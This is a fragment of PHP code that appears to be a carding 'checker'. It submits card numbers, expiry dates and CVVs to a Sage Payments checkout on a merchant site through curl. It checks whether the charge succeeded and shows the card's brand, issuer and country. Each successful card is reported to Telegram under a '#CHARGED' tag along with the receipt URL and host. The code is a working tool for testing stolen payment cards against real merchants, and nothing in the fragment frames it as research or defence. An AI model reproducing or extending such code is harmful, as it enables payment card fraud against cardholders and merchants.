...
$paymentMethods = [
    ...
    'sagepaymentsusaapi' => '/<input[^>]*name="payment_method"[^>]*value="sagepaymentsusaapi"/'
    ];
...
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    ...
    'sagepaymentsusaapi-card-number' => $cc,
    'sagepaymentsusaapi-card-expiry' => $mes_with_zero . ' / ' . $ano_no_20,
    'sagepaymentsusaapi-card-cvc' =>  $cvv,
...
if ($isoCountry !== 'Not found') {
 ...
 if (strpos($Payment, '"result":"success","redirect"') !== false && strpos($Payment, 'order-received') !== false) { 
    ...
    <span style="color: #15b823ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
      ...
      $telegramMessage = "[#CHARGED]- $lista [CVV CHARGED SAGEUSAAPI]
      \n[$receiptUrl]
    \n[$hostname1]\n";
